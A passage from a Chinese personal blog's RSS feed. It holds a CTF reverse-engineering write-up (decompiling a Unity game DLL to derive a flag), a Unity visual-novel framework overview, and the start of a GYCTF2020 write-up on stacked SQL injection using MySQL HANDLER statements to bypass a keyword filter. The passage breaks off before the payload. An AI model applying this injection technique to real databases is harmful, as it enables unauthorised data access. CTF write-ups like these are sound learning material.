        <pubDate>Sun, 25 Apr 2021 05:05:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/</guid>
        <description>&lt;h2 id=&#34;前提&#34;&gt;前提：
&lt;/h2&gt;&lt;p&gt;最近沉迷游戏开发，想着在不考虑上线的情况下和别人合作做几款产品出来。正好碰上校赛，那就用手边的一些小练习写个re题。&lt;/p&gt;
&lt;p&gt;打包项目的时候，如果不进行其他操作，项目中的cs代码，甭管有用的没用的，在打包时通通都会被打进Assembly-CSharp.dll中，运行的时候通过Mono调用。所以有一种保护项目的手段就是对导出工程的Assembly-CSharp.dll进行加密，加载的时候对之进行解密&lt;/p&gt;
&lt;h2 id=&#34;wp&#34;&gt;wp：
&lt;/h2&gt;&lt;p&gt;这个题大部分精力放在写游戏逻辑上了，所以没有对项目进行保护措施。&lt;/p&gt;
&lt;p&gt;直接进入GameTime!\GameStart_Data\Managed目录找Assembly-CSharp.dll文件，扔进dnspy或者其他的.net反编译工具里就能看到源码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416417-1188658214.png&#34;
	width=&#34;250&#34;
	height=&#34;273&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416417-1188658214_hu9884638556566314793.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416417-1188658214_hu13320748773009564822.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210425125348912&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;91&#34;
		data-flex-basis=&#34;219px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看着文件挺多，但是绝大部分都是游戏逻辑，跟flag没什么关系。&lt;/p&gt;
&lt;p&gt;为了方便定位我直接把加密flag的cs代码命名成带有flag的文件，所以我们进入ScoreAndFlag里面看看：&lt;/p&gt;
&lt;p&gt;代码写的比较丑，但逻辑还是能看明白的，比如ScoreAdd:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416771-1258754363.png&#34;
	width=&#34;762&#34;
	height=&#34;307&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416771-1258754363_hu5513725567400210530.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416771-1258754363_hu286294920055328002.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210425125552200&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;flag就是对“974”进行sha1的结果在来一次md5。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416981-369114685.png&#34;
	width=&#34;808&#34;
	height=&#34;346&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416981-369114685_hu15298188296169523173.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130416981-369114685_hu9590298798047327638.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210425125658232&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;560px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;sha1最终返回的结果全部大写，这些结果在传给md5()，返回前三十位，就是flag了。&lt;/p&gt;
&lt;p&gt;所以这个题出的一般，因为他只是个垃圾小游戏，不是题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130417275-968003280.png&#34;
	width=&#34;500&#34;
	height=&#34;205&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130417275-968003280_hu11485888140964869982.png 480w, https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/1858293-20210425130417275-968003280_hu17483444966984650277.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210425125724738&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;243&#34;
		data-flex-basis=&#34;585px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;题目文件&#34;&gt;题目文件：
&lt;/h2&gt;&lt;p&gt;链接：https://pan.baidu.com/s/1dNlYwzzbDNHjcMo_2lUtiw
提取码：kq1z&lt;/p&gt;
&lt;p&gt;感谢阅读。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【Unity】自制GalGame框架梳理</title>
        <link>https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/</link>
        <pubDate>Sun, 04 Apr 2021 09:17:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/</guid>
        <description>&lt;h1 id=&#34;框架梳理&#34;&gt;框架梳理
&lt;/h1&gt;&lt;p&gt;目前分为五块：菜单场景、游戏场景、CG场景、存读取存档场景、场景衔接。
 
未来添加的一些功能：游戏设置界面、游戏过程中的读档等UI、程序和剧情分离，供编剧测试的插件、对话回顾等。
 
个人学习作品，仅供参考，两周匆忙赶出，代码水平不高，还望见笑。
 
 &lt;/p&gt;
&lt;h2 id=&#34;菜单场景&#34;&gt;菜单场景：
&lt;/h2&gt;&lt;p&gt;主要功能：作为菜单，为不同按钮绑定切换场景的事件。&lt;/p&gt;
&lt;p&gt;主要函数：&lt;/p&gt;
&lt;p&gt;Awake()：为各个button绑定事件&lt;/p&gt;
&lt;p&gt;OpenGame()：切换场景到游戏场景&lt;/p&gt;
&lt;p&gt;OpenCG()：切换场景到查看cg&lt;/p&gt;
&lt;p&gt;OpenFiles()：切换场景到读取存档&lt;/p&gt;
&lt;p&gt;ExitGame()：退出游戏&lt;/p&gt;
&lt;h2 id=&#34;cg场景&#34;&gt;CG场景：
&lt;/h2&gt;&lt;p&gt;主要功能：提供可以查看cg图像或是人物简介等游戏内容的场景，目前只能查看cg图像&lt;/p&gt;
&lt;p&gt;主要函数：&lt;/p&gt;
&lt;p&gt;存在GlobalSetting.CGShows[]变量存放在GlobalSetting.cs中，作为是否解锁cg图的参考。&lt;/p&gt;
&lt;p&gt;Start()： 通过读取GlobalSetting.cs中的全局变量来判定是否给图像解锁。&lt;/p&gt;
&lt;p&gt;Update()：检测是否打开了cg图像，如果打开了cg的话点击任意位置退出&lt;/p&gt;
&lt;p&gt;BackToMenu()：返回到主界面&lt;/p&gt;
&lt;p&gt;ShowCG()：打开panel，显示cg&lt;/p&gt;
&lt;p&gt;【暂留问题】：每次重新启动游戏时，全局变量重置，需要在其他地方另外保存数据
 
 &lt;/p&gt;
&lt;h2 id=&#34;游戏场景&#34;&gt;游戏场景：
&lt;/h2&gt;&lt;h3 id=&#34;游戏场景初始化cs&#34;&gt;游戏场景初始化.cs
&lt;/h3&gt;&lt;p&gt;在Awake()中读取存档，若不为空则提前初始化gamescene&lt;/p&gt;
&lt;h3 id=&#34;游戏场景cs&#34;&gt;游戏场景.cs
&lt;/h3&gt;&lt;p&gt;主要功能：提供游戏界面的显示，根据剧本推进剧情。提供存档读档。有一个渐入渐出状态机。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170355093-1429446084.png&#34;
	width=&#34;574&#34;
	height=&#34;407&#34;
	srcset=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170355093-1429446084_hu17181300484585710495.png 480w, https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170355093-1429446084_hu3877133373653893625.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210404164741671&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;141&#34;
		data-flex-basis=&#34;338px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;主要函数：&lt;/p&gt;
&lt;p&gt;Start()：初始化，调用Init()函数&lt;/p&gt;
&lt;p&gt;Update()：检测到点击则开始下一条剧情，同时提供图片的淡入淡出功能&lt;/p&gt;
&lt;p&gt;Init()：一些参数的定义（淡入淡出的状态等），绑定按钮事件&lt;/p&gt;
&lt;p&gt;ShowFileSave()：调用之后出现存档的panel&lt;/p&gt;
&lt;p&gt;SetBackground(string bgName)：传入名字从resources中调出背景图片并显示&lt;/p&gt;
&lt;p&gt;DelBackground()：渐出背景图片&lt;/p&gt;
&lt;p&gt;SetCharaImage(string charaName, string pos)：传入名字和位置从resources中调出人物图片并在左或右侧显示&lt;/p&gt;
&lt;p&gt;DelCharaImage(string pos)：渐出人物图片&lt;/p&gt;
&lt;p&gt;FadeInImg(Image img)：渐入图片需要调用的函数，修改渐入渐出状态机&lt;/p&gt;
&lt;p&gt;FadeOutImg(Image img)：渐出图片需要调用的函数，修改渐入渐出状态机&lt;/p&gt;
&lt;p&gt;UpdateColorAlpha()：在渐入渐出状态机执行的时候进行图片的alpha检测和切换，alpha&amp;gt;1或&amp;lt;0时切换状态&lt;/p&gt;
&lt;p&gt;UpdateColorAlphaRightNow()：在图片渐入渐出的时候如果鼠标点击，则立刻修改状态并完全渐入/渐出图片（即图片的透明度立刻变为0或1）&lt;/p&gt;
&lt;p&gt;SetDialogText(string name,string content)：对话框的姓名和内容&lt;/p&gt;
&lt;p&gt;SetTalkingChara(string pos)：调整正在说话的人物的图片透明度，突出对话的主体人物&lt;/p&gt;
&lt;p&gt;SetMusic(string bgmName)：传入名字从resources中调出音乐并播放&lt;/p&gt;
&lt;p&gt;BackToMenu()：返回主菜单&lt;/p&gt;
&lt;p&gt;SetCharaImageFromFile(string charaName, string pos)：从存档中进入时，传入名字和位置从resources中调出人物图片并在左或右侧显示&lt;/p&gt;
&lt;p&gt;SetBackgroundFromFile(string bgName)：从存档中进入时，传入名字从resources中调出背景图片并显示&lt;/p&gt;
&lt;p&gt;【存在问题】：这里十分臃肿，只有写出这个的人（我）才能理解大概。&lt;/p&gt;
&lt;h3 id=&#34;剧本读取与解析cs&#34;&gt;剧本读取与解析.cs
&lt;/h3&gt;&lt;p&gt;主要功能：读取剧本存入对应的数据结构中并解析，反馈给游戏界面。有一个剧情状态机&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170358188-1334500693.png&#34;
	width=&#34;523&#34;
	height=&#34;442&#34;
	srcset=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170358188-1334500693_hu9993723471173240850.png 480w, https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404170358188-1334500693_hu15319469634875121109.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210404165526955&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;118&#34;
		data-flex-basis=&#34;283px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;主要函数：&lt;/p&gt;
&lt;p&gt;Start()：读取剧本文件并存入到自定义数据类型ItemManager中&lt;/p&gt;
&lt;p&gt;Update()：剧情状态检测&lt;/p&gt;
&lt;p&gt;Clicked()：鼠标点击事件，可以切换状态&lt;/p&gt;
&lt;p&gt;StartAVG()：初始化状态机&lt;/p&gt;
&lt;p&gt;GoToState(STAGE next)：提供状态，切换到该状态&lt;/p&gt;
&lt;p&gt;PraseNextLine()：分析下一行剧情命令，并传入对应的函数&lt;/p&gt;
&lt;p&gt;DealWithCommand(Line tmpLine)：按照Command剧情命令执行&lt;/p&gt;
&lt;p&gt;CheckTypingFinished()：检查对话时是否说完&lt;/p&gt;
&lt;p&gt;DealWithText(Line tmpLine)：按照Text剧情命令执行&lt;/p&gt;
&lt;p&gt;UpdateContentString()：按帧更新对话框内容，实现打字机的效果&lt;/p&gt;
&lt;p&gt;UpdateAllString()：在打字机打字的过程中若是再次点击鼠标则一次性显示未说完的所有内容。&lt;/p&gt;
&lt;h3 id=&#34;存档管理cs&#34;&gt;存档管理.cs
&lt;/h3&gt;&lt;p&gt;Start()：绑定按钮事件，创造文件路径&lt;/p&gt;
&lt;p&gt;ClosePanel()：关闭存档panel&lt;/p&gt;
&lt;p&gt;PackingData(SaveData sd1)：打包存档数据&lt;/p&gt;
&lt;p&gt;WriteData(StreamWriter temp)：写入存档&lt;/p&gt;
&lt;p&gt;ClickSave()：点击存档按钮即可存档。&lt;/p&gt;
&lt;p&gt; 
 &lt;/p&gt;
&lt;h2 id=&#34;存读取存档场景&#34;&gt;存读取存档场景：
&lt;/h2&gt;&lt;h3 id=&#34;存档场景管理cs&#34;&gt;存档场景管理.cs
&lt;/h3&gt;&lt;p&gt;主要功能：再打开存档场景时加载存档，并提供入口进入游戏。&lt;/p&gt;
&lt;p&gt;主要函数：Start()、BackToMenu()、LoadData()&lt;/p&gt;
&lt;p&gt;Start()：读取存档文件并绑定按钮事件&lt;/p&gt;
&lt;p&gt;BackToMenu()：返回主菜单&lt;/p&gt;
&lt;p&gt;LoadData()：加载存档并进入游戏&lt;/p&gt;
&lt;h3 id=&#34;读档cs&#34;&gt;读档.cs
&lt;/h3&gt;&lt;p&gt;Awake()：单例模式&lt;/p&gt;
&lt;p&gt;WriteSceneData(List&amp;lt;string[]&amp;gt; data)：将存档写入列队，方便加载游戏场景的时候读取&lt;/p&gt;
&lt;p&gt;ReadSceneData()：在gameseceninit中读取存档列队&lt;/p&gt;
&lt;p&gt;ToGameScene(string[] SaveFile)：跳转到游戏场景&lt;/p&gt;
&lt;h3 id=&#34;存档cs&#34;&gt;存档.cs
&lt;/h3&gt;&lt;p&gt;自定义数据结构，存放着存档和读档需要的数据，包括剧情脚本行数、对话、背景、音乐等。&lt;/p&gt;
&lt;p&gt; 
 &lt;/p&gt;
&lt;h2 id=&#34;场景衔接&#34;&gt;场景衔接
&lt;/h2&gt;&lt;p&gt;例如背景音乐在主菜单和存档场景切换时不会停掉、画面的渐入渐出。&lt;/p&gt;
&lt;p&gt;背景音乐的控制：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;建立一个循环音乐的预制体，这个预制体上挂载一个DontDestroyOnLoad的脚本。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在需要播放背景音乐的几个场景挂载另一个GlobalUIMusic.cs，这个脚本为单例模式，如果存在则不产生新的，如果不存在则实例化预制体。
 
 &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;成品gif&#34;&gt;成品GIF
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404171556588-791284151.gif&#34;
	width=&#34;1165&#34;
	height=&#34;547&#34;
	srcset=&#34;https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404171556588-791284151_hu17152501095760284653.gif 480w, https://dorinxl.github.io/p/unity%E8%87%AA%E5%88%B6galgame%E6%A1%86%E6%9E%B6%E6%A2%B3%E7%90%86/1858293-20210404171556588-791284151_hu14626753662874542769.gif 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;212&#34;
		data-flex-basis=&#34;511px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>HANDLER进行堆叠注入</title>
        <link>https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</link>
        <pubDate>Fri, 20 Nov 2020 09:22:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</guid>
        <description>&lt;h1 id=&#34;handler进行堆叠注入&#34;&gt;HANDLER进行堆叠注入
&lt;/h1&gt;&lt;h2 id=&#34;gyctf2020blacklist&#34;&gt;[GYCTF2020]Blacklist
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171802685-2439628.png&#34;
	width=&#34;1033&#34;
	height=&#34;176&#34;
	srcset=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171802685-2439628_hu10348564076056423732.png 480w, https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171802685-2439628_hu513661290443638928.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201120161425003&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;586&#34;
		data-flex-basis=&#34;1408px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;过滤了很多的关键词&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803161-38417002.png&#34;
	width=&#34;765&#34;
	height=&#34;646&#34;
	srcset=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803161-38417002_hu1094983048381473900.png 480w, https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803161-38417002_hu8674992940947666909.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201120161508722&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;118&#34;
		data-flex-basis=&#34;284px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;你可以尽情堆叠，但是令人难过的是你读不出来，也不能像强网杯那样alert改名字。&lt;/p&gt;
&lt;p&gt;但是我们还有&lt;strong&gt;handler&lt;/strong&gt;这个东西&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HANDLER tbl_name OPEN [ [AS] alias]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HANDLER tbl_name READ index_name { = | &amp;lt;= | &amp;gt;= | &amp;lt; | &amp;gt; } (value1,value2,...)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [ WHERE where_condition ] [LIMIT ... ]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [ WHERE where_condition ] [LIMIT ... ]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HANDLER tbl_name READ { FIRST | NEXT }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [ WHERE where_condition ] [LIMIT ... ]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HANDLER tbl_name CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过HANDLER tbl_name CLOSE来关闭打开的句柄。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过索引去查看的话可以按照一定的顺序，获取表中的数据。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过索引列指定一个值，可以指定从哪一行开始。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803597-447007445.png&#34;
	width=&#34;1392&#34;
	height=&#34;508&#34;
	srcset=&#34;https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803597-447007445_hu10079596799951348116.png 480w, https://dorinxl.github.io/p/handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/1858293-20201120171803597-447007445_hu3074475778368155339.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201120162237893&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;274&#34;
		data-flex-basis=&#34;657px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
